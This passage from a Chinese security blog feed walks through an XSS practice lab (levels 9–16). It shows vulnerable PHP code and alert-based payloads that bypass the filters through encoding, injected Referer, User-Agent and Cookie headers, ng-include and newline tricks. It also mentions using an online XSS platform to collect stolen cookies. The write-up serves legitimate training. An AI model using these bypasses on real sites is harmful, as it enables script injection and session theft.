operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">'"'</span>,<span class="token string">'&amp;quot'</span>,<span class="token variable">$str6</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'&lt;center>&lt;form action=level9.php method=GET>&lt;input name=keyword  value="'</span>.htmlspecialchars<span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span>.<span class="token string">'">&lt;input type=submit name=submit value=添加友情链接 />&lt;/form>&lt;/center>'</span><span class="token punctuation">;</span>?<span class="token operator">></span><span class="token operator">&lt;</span>?phpif<span class="token punctuation">(</span>false<span class="token operator">==</span><span class="token operator">=</span>strpos<span class="token punctuation">(</span><span class="token variable">$str7</span>,<span class="token string">'http://'</span><span class="token punctuation">))</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>  <span class="token keyword">echo</span> <span class="token string">'&lt;center>&lt;BR>&lt;a href="您的链接不合法？有没有！">友情链接&lt;/a>&lt;/center>'</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token keyword">else</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>  <span class="token keyword">echo</span> <span class="token string">'&lt;center>&lt;BR>&lt;a href="'</span><span class="token keyword">.</span><span class="token variable">$str7</span><span class="token keyword">.</span><span class="token string">'">友情链接&lt;/a>&lt;/center>'</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>?<span class="token operator">></span><span class="token operator">&lt;</span>center<span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span>level9.png<span class="token operator">></span><span class="token operator">&lt;</span>/center<span class="token operator">></span><span class="token operator">&lt;</span>?php</code></pre><p>通关代码if(false&#x3D;&#x3D;&#x3D;strpos($str7,’http:&#x2F;&#x2F;‘)) 判断是否包含http:&#x2F;&#x2F;然后返回,也就是说这里不能直接使用http:&#x2F;&#x2F;，因此这里要采用编码</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;//http://</span></code></pre><p><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/13.png"><br><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/14.png"></p><h4 id="level10"><a href="#level10" class="headerlink" title="level10"></a><font size="4"><strong>level10</strong></font></h4><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?phpini_set<span class="token punctuation">(</span><span class="token string">"display_errors"</span>, 0<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str11</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"t_sort"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str22</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">">"</span>,<span class="token string">""</span>,<span class="token variable">$str11</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str33</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"&lt;"</span>,<span class="token string">""</span>,<span class="token variable">$str22</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;h2 align=center>没有找到和"</span>.htmlspecialchars<span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span>.<span class="token string">"相关的结果.&lt;/h2>"</span><span class="token keyword">.</span><span class="token string">'&lt;center>&lt;form id=search>&lt;input name="t_link"  value="'</span><span class="token keyword">.</span><span class="token string">'" type="hidden">&lt;input name="t_history"  value="'</span><span class="token keyword">.</span><span class="token string">'" type="hidden">&lt;input name="t_sort"  value="'</span><span class="token keyword">.</span><span class="token variable">$str33</span><span class="token keyword">.</span><span class="token string">'" type="hidden">&lt;/form>&lt;/center>'</span><span class="token punctuation">;</span>?<span class="token operator">></span><span class="token operator">&lt;</span>center<span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span>level10.png<span class="token operator">></span><span class="token operator">&lt;</span>/center<span class="token operator">></span><span class="token operator">&lt;</span>?php</code></pre><p><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/15.png"></p><p>看到这个就知道是要测试出要提交的是哪一个表单，由于源码中我们已经知道是通过t_sort表单提交的数据。</p><pre class=" language-bash"><code class="language-bash">?keyword<span class="token operator">=</span><span class="token operator">&lt;</span>script<span class="token operator">></span>alert<span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span>/script<span class="token operator">></span><span class="token operator">&amp;</span>t_sort<span class="token operator">=</span><span class="token string">" type="</span>text<span class="token string">" onclick="</span>alert<span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span></code></pre><p><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/16.png"></p><h4 id="level11"><a href="#level11" class="headerlink" title="level11"></a><font size="4"><strong>level11</strong></font></h4><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?phpini_set<span class="token punctuation">(</span><span class="token string">"display_errors"</span>, 0<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str00</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"t_sort"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str11</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_REFERER'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str22</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">">"</span>,<span class="token string">""</span>,<span class="token variable">$str11</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str33</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"&lt;"</span>,<span class="token string">""</span>,<span class="token variable">$str22</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;h2 align=center>没有找到和"</span>.htmlspecialchars<span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span>.<span class="token string">"相关的结果.&lt;/h2>"</span><span class="token keyword">.</span><span class="token string">'&lt;center>&lt;form id=search>&lt;input name="t_link"  value="'</span><span class="token keyword">.</span><span class="token string">'" type="hidden">&lt;input name="t_history"  value="'</span><span class="token keyword">.</span><span class="token string">'" type="hidden">&lt;input name="t_sort"  value="'</span>.htmlspecialchars<span class="token punctuation">(</span><span class="token variable">$str00</span><span class="token punctuation">)</span>.<span class="token string">'" type="hidden">&lt;input name="t_ref"  value="'</span><span class="token keyword">.</span><span class="token variable">$str33</span><span class="token keyword">.</span><span class="token string">'" type="hidden">&lt;/form>&lt;/center>'</span><span class="token punctuation">;</span>?<span class="token operator">></span><span class="token operator">&lt;</span>center<span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span>level11.png<span class="token operator">></span><span class="token operator">&lt;</span>/center<span class="token operator">></span><span class="token operator">&lt;</span>?php</code></pre><p>这一关卡和上面的一关非常的像多了一个input表单的信息，在服务器端还将请求头中的referer头的值赋给了str11这个变量，$_SERVER[‘HTTP_REFERER’]  #链接到当前页面的前一页面的 URL 地址，也就是说这里可以做点文章。在将变量值中的&lt;和&gt;删除之后就会插入到t_ref这个标签的value属性值中。而上一关的t_sort标签虽然也能接收并显示参数值，但是这个参数值是要用htmlspecialchars()函数处理的。</p><p>抓包分析<br><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/17.png"></p><p>可以看到的是数据包中没得关于refer的信息我们构造一个refer的数据包发送出去<br><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/18.png"></p><p>构造payload代码</p><pre class=" language-bash"><code class="language-bash">referer:<span class="token string">"type="</span>text<span class="token string">" onclick="</span>alert<span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span></code></pre><p><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/19.png"></p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>input name<span class="token operator">=</span><span class="token string">"t_ref"</span>  value<span class="token operator">=</span><span class="token string">""</span>type<span class="token operator">=</span><span class="token string">"text"</span> onclick<span class="token operator">=</span><span class="token string">"alert('xss')"</span> type<span class="token operator">=</span><span class="token string">"hidden"</span><span class="token operator">></span></code></pre><p><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/20.png"></p><h4 id="level12"><a href="#level12" class="headerlink" title="level12"></a><font size="4"><strong>level12</strong></font></h4><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?phpini_set<span class="token punctuation">(</span><span class="token string">"display_errors"</span>, 0<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str00</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"t_sort"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str11</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_USER_AGENT'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str22</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">">"</span>,<span class="token string">""</span>,<span class="token variable">$str11</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str33</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"&lt;"</span>,<span class="token string">""</span>,<span class="token variable">$str22</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;h2 align=center>没有找到和"</span>.htmlspecialchars<span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span>.<span class="token string">"相关的结果.&lt;/h2>"</span><span class="token keyword">.</span><span class="token string">'&lt;center>&lt;form id=search>&lt;input name="t_link"  value="'</span><span class="token keyword">.</span><span class="token string">'" type="hidden">&lt;input name="t_history"  value="'</span><span class="token keyword">.</span><span class="token string">'" type="hidden">&lt;input name="t_sort"  value="'</span>.htmlspecialchars<span class="token punctuation">(</span><span class="token variable">$str00</span><span class="token punctuation">)</span>.<span class="token string">'" type="hidden">&lt;input name="t_ua"  value="'</span><span class="token keyword">.</span><span class="token variable">$str33</span><span class="token keyword">.</span><span class="token string">'" type="hidden">&lt;/form>&lt;/center>'</span><span class="token punctuation">;</span>?<span class="token operator">></span><span class="token operator">&lt;</span>center<span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span>level12.png<span class="token operator">></span><span class="token operator">&lt;</span>/center<span class="token operator">></span><span class="token operator">&lt;</span>?php<span class="token keyword">echo</span> <span class="token string">"&lt;h3 align=center>payload的长度:"</span>.strlen<span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span>.<span class="token string">"&lt;/h3>"</span><span class="token punctuation">;</span>?<span class="token operator">></span></code></pre><p>用户访问服务器时,利用PHP的超级全局变量$_SERVER数组中字段[‘HTTP_USER_AGENT’] 获取访问用户的所有信息通过http头获取user-agent字段的值作为t_ua的value，利用burp抓包，修改http的头部的user-agent字段。</p><p>正常抓包执行<br><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/21.png"></p><p>修改user-agent信息</p><pre class=" language-bash"><code class="language-bash">user-agent: t_sort<span class="token operator">=</span>2<span class="token string">" onclick="</span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token string">" type="</span>text"</code></pre><p><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/22.png"></p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>input name<span class="token operator">=</span><span class="token string">"t_ua"</span>  value<span class="token operator">=</span><span class="token string">"t_sort=2"</span> onclick<span class="token operator">=</span><span class="token string">"alert(1)"</span> type<span class="token operator">=</span><span class="token string">"text"</span> type<span class="token operator">=</span><span class="token string">"hidden"</span><span class="token operator">></span></code></pre><p><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/23.png"></p><h4 id="level13"><a href="#level13" class="headerlink" title="level13"></a><font size="4"><strong>level13</strong></font></h4><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?phpsetcookie<span class="token punctuation">(</span><span class="token string">"user"</span>, <span class="token string">"call me maybe?"</span>, time<span class="token punctuation">(</span><span class="token punctuation">)</span>+3600<span class="token punctuation">)</span><span class="token punctuation">;</span>ini_set<span class="token punctuation">(</span><span class="token string">"display_errors"</span>, 0<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str00</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"t_sort"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str11</span><span class="token operator">=</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str22</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">">"</span>,<span class="token string">""</span>,<span class="token variable">$str11</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str33</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"&lt;"</span>,<span class="token string">""</span>,<span class="token variable">$str22</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;h2 align=center>没有找到和"</span>.htmlspecialchars<span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span>.<span class="token string">"相关的结果.&lt;/h2>"</span><span class="token keyword">.</span><span class="token string">'&lt;center>&lt;form id=search>&lt;input name="t_link"  value="'</span><span class="token keyword">.</span><span class="token string">'" type="hidden">&lt;input name="t_history"  value="'</span><span class="token keyword">.</span><span class="token string">'" type="hidden">&lt;input name="t_sort"  value="'</span>.htmlspecialchars<span class="token punctuation">(</span><span class="token variable">$str00</span><span class="token punctuation">)</span>.<span class="token string">'" type="hidden">&lt;input name="t_cook"  value="'</span><span class="token keyword">.</span><span class="token variable">$str33</span><span class="token keyword">.</span><span class="token string">'" type="hidden">&lt;/form>&lt;/center>'</span><span class="token punctuation">;</span>?<span class="token operator">></span><span class="token operator">&lt;</span>center<span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span>level13.png<span class="token operator">></span><span class="token operator">&lt;</span>/center<span class="token operator">></span><span class="token operator">&lt;</span>?php<span class="token keyword">echo</span> <span class="token string">"&lt;h3 align=center>payload的长度:"</span>.strlen<span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span>.<span class="token string">"&lt;/h3>"</span><span class="token punctuation">;</span>?<span class="token operator">></span></code></pre><p>通过http头获取cookie字段的值作为t_cook的value，利用burp抓包，修改http的头部cookie字段。</p><p>正常抓包<br><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/24.png"></p><p>修改数据包</p><pre class=" language-bash"><code class="language-bash">cookie: user<span class="token operator">=</span>2<span class="token string">" onclick="</span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token string">" type="</span>text"</code></pre><p><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/25.png"></p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>input name<span class="token operator">=</span><span class="token string">"t_cook"</span>  value<span class="token operator">=</span><span class="token string">"2"</span> onclick<span class="token operator">=</span><span class="token string">"alert(1)"</span> type<span class="token operator">=</span><span class="token string">"text"</span> type<span class="token operator">=</span><span class="token string">"hidden"</span><span class="token operator">></span></code></pre><p><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/26.png"></p><h4 id="level14"><a href="#level14" class="headerlink" title="level14"></a><font size="4"><strong>level14</strong></font></h4><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>html<span class="token operator">></span><span class="token operator">&lt;</span>head<span class="token operator">></span><span class="token operator">&lt;</span>meta http-equiv<span class="token operator">=</span><span class="token string">"content-type"</span> content<span class="token operator">=</span><span class="token string">"text/html;charset=utf-8"</span><span class="token operator">></span><span class="token operator">&lt;</span>title<span class="token operator">></span>欢迎来到level14<span class="token operator">&lt;</span>/title<span class="token operator">></span><span class="token operator">&lt;</span>/head<span class="token operator">></span><span class="token operator">&lt;</span>body<span class="token operator">></span><span class="token operator">&lt;</span>h1 align<span class="token operator">=</span>center<span class="token operator">></span>欢迎来到level14<span class="token operator">&lt;</span>/h1<span class="token operator">></span><span class="token operator">&lt;</span>center<span class="token operator">></span><span class="token operator">&lt;</span>iframe name<span class="token operator">=</span><span class="token string">"leftframe"</span> marginwidth<span class="token operator">=</span>10 marginheight<span class="token operator">=</span>10 src<span class="token operator">=</span><span class="token string">"http://www.exifviewer.org/"</span> frameborder<span class="token operator">=</span>no width<span class="token operator">=</span><span class="token string">"80%"</span> scrolling<span class="token operator">=</span><span class="token string">"no"</span> height<span class="token operator">=</span>80%<span class="token operator">></span><span class="token operator">&lt;</span>/iframe<span class="token operator">></span><span class="token operator">&lt;</span>/center<span class="token operator">></span><span class="token operator">&lt;</span>center<span class="token operator">></span>这关成功后不会自动跳转。成功者<span class="token operator">&lt;</span>a href<span class="token operator">=</span>/xss/level15.php?src<span class="token operator">=</span>1.gif<span class="token operator">></span>点我进level15<span class="token operator">&lt;</span>/a<span class="token operator">></span><span class="token operator">&lt;</span>/center<span class="token operator">></span><span class="token operator">&lt;</span>/body<span class="token operator">></span><span class="token operator">&lt;</span>/html<span class="token operator">></span></code></pre><p>漏洞描述：修改iframe调用的文件来实现xss注入(但因为iframe调用的文件地址失效，无法进行测试</p><h4 id="level15"><a href="#level15" class="headerlink" title="level15"></a><font size="4"><strong>level15</strong></font></h4><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>html ng-app<span class="token operator">></span><span class="token operator">&lt;</span>head<span class="token operator">></span>        <span class="token operator">&lt;</span>meta charset<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token operator">></span>        <span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"angular.min.js"</span><span class="token operator">></span><span class="token operator">&lt;</span>/script<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>window.alert <span class="token operator">=</span> function<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>confirm<span class="token punctuation">(</span><span class="token string">"完成的不错！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> window.location.href<span class="token operator">=</span><span class="token string">"level16.php?keyword=test"</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token operator">&lt;</span>/script<span class="token operator">></span><span class="token operator">&lt;</span>title<span class="token operator">></span>欢迎来到level15<span class="token operator">&lt;</span>/title<span class="token operator">></span><span class="token operator">&lt;</span>/head<span class="token operator">></span><span class="token operator">&lt;</span>h1 align<span class="token operator">=</span>center<span class="token operator">></span>欢迎来到第15关，自己想个办法走出去吧！<span class="token operator">&lt;</span>/h1<span class="token operator">></span><span class="token operator">&lt;</span>p align<span class="token operator">=</span>center<span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span>level15.png<span class="token operator">></span><span class="token operator">&lt;</span>/p<span class="token operator">></span><span class="token operator">&lt;</span>?phpini_set<span class="token punctuation">(</span><span class="token string">"display_errors"</span>, 0<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"src"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'&lt;body>&lt;span class="ng-include:'</span>.htmlspecialchars<span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span>.<span class="token string">'">&lt;/span>&lt;/body>'</span><span class="token punctuation">;</span>?<span class="token operator">></span></code></pre><pre class=" language-bash"><code class="language-bash">从源码中可以看到的是传递参数src1、ng-include 指令用于包含外部的 HTML文件。2、包含的内容将作为指定元素的子节点。3、ng-include 属性的值可以是一个表达式，返回一个文件名。4、默认情况下，包含的文件需要包含在同一个域名下。特别值得注意的几点如下：1.ng-include,如果单纯指定地址，必须要加引号2.ng-include,加载外部html，script标签中的内容不执行3.ng-include,加载外部html中含有style标签样式可以识别构造函数?src<span class="token operator">=</span><span class="token string">'level1.php?name=&lt;img src=1 onerror=alert(1)>'</span>因为这里参数值算是一个地址，所以需要添加引号。但是level1.php不是一个php文件吗？这里解释一下这是因为我们不是单纯的去包含level1.php，而是在后面添加了name参数值的。这就有点像是在访问了该参数值中地址之后把它响应在浏览器端的html文件给包含进来的意思。</code></pre><p><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/27.png"></p><h4 id="level16"><a href="#level16" class="headerlink" title="level16"></a><font size="4"><strong>level16</strong></font></h4><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?phpini_set<span class="token punctuation">(</span><span class="token string">"display_errors"</span>, 0<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> strtolower<span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str2</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"script"</span>,<span class="token string">"&amp;nbsp;"</span>,<span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str3</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">" "</span>,<span class="token string">"&amp;nbsp;"</span>,<span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str4</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"/"</span>,<span class="token string">"&amp;nbsp;"</span>,<span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str5</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"     "</span>,<span class="token string">"&amp;nbsp;"</span>,<span class="token variable">$str4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;center>"</span><span class="token keyword">.</span><span class="token variable">$str5</span><span class="token keyword">.</span><span class="token string">"&lt;/center>"</span><span class="token punctuation">;</span>?<span class="token operator">></span><span class="token operator">&lt;</span>center<span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span>level16.png<span class="token operator">></span><span class="token operator">&lt;</span>/center<span class="token operator">></span><span class="token operator">&lt;</span>?php<span class="token keyword">echo</span> <span class="token string">"&lt;h3 align=center>payload的长度:"</span>.strlen<span class="token punctuation">(</span><span class="token variable">$str5</span><span class="token punctuation">)</span>.<span class="token string">"&lt;/h3>"</span><span class="token punctuation">;</span>?<span class="token operator">></span></code></pre><pre class=" language-bash"><code class="language-bash">将参数值中的script替换成<span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span>将参数值中的空格也替换成<span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span>将参数值中的/符号替换成<span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span>绕过思路：可以用回车来将它们分开。<span class="token operator">&lt;</span>img%0Asrc<span class="token operator">=</span>1%0Aonerror<span class="token operator">=</span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token operator">></span></code></pre><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>img%0Asrc<span class="token operator">=</span>1%0Aonerror<span class="token operator">=</span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token operator">></span></code></pre><p><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/28.png"></p><h3 id="jfdd靶场"><a href="#jfdd靶场" class="headerlink" title="jfdd靶场"></a><font size="5"><strong>jfdd靶场</strong></font></h3><p><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/29.png"><br><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/30.png"></p><p>注册xss平台账号，当然也可以自己搭建<a href="https://xss8.cc/register/,%E8%BF%99%E6%A0%B7%E7%9A%84%E5%9C%A8%E7%BA%BF%E7%BD%91%E7%AB%99%E5%8F%AF%E4%BB%A5%E5%B8%AE%E6%88%91%E4%BB%AC%E6%8E%A5%E5%8F%97%E7%BD%91%E7%AB%99%E7%9A%84cookie%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AF%E8%AF%B4%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E5%9C%A8%E7%BA%BF%E7%9A%84xss%E5%B9%B3%E5%8F%B0%E4%BD%9C%E4%B8%BA%E7%AC%AC%E4%B8%89%E6%96%B9%E5%B7%A5%E5%85%B7%E7%9B%97%E5%8F%96%E7%BD%91%E7%AB%99%E4%BF%A1%E6%81%AF%EF%BC%8C%E5%90%8C%E6%97%B6%E4%B9%9F%E5%AD%98%E5%9C%A8%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98%E5%B0%B1%E6%98%AF%E6%88%91%E4%BB%AC%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9A%84%E8%BF%87%E7%A8%8B%E5%BD%93%E4%B8%AD%E6%88%91%E4%BB%AC%E8%8E%B7%E5%8F%96%E7%9A%84%E7%BD%91%E7%AB%99%E4%BF%A1%E6%81%AF%E6%9C%89%E5%8F%AF%E8%83%BD%E4%BC%9A%E8%A2%AB%E8%BF%99%E4%BA%9B%E5%B9%B3%E5%8F%B0%E7%99%BD%E5%AB%96%EF%BC%8C%E8%BF%98%E6%9C%89%E5%B0%B1%E6%98%AF%E6%88%91%E4%BB%AC%E5%9C%A8%E7%BD%91%E4%B8%8A%E4%B8%8B%E8%BD%BD%E7%9A%84xss(%E6%88%96%E8%80%85%E6%98%AF%E5%85%B6%E4%BB%96%E5%B7%A5%E5%85%B7)%E5%BE%88%E6%9C%89%E5%8F%AF%E8%83%BD%E6%98%AF%E5%B8%A6%E5%90%8E%E9%97%A8%E7%9A%84%E3%80%82">https://xss8.cc/register/,这样的在线网站可以帮我们接受网站的cookie，也就是说我们可以通过在线的xss平台作为第三方工具盗取网站信息，同时也存在一些问题就是我们的渗透测试的过程当中我们获取的网站信息有可能会被这些平台白嫖，还有就是我们在网上下载的xss(或者是其他工具)很有可能是带后门的。</a></p><p>由于上面的靶场，各种各样的问题导致环境根本无法运行起来，我也没找到合适的替代靶场只有先截图和文字记录。</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-025</title>
      <link href="/2023/10/08/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-025/"/>
      <url>/2023/10/08/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-025/</url>
      
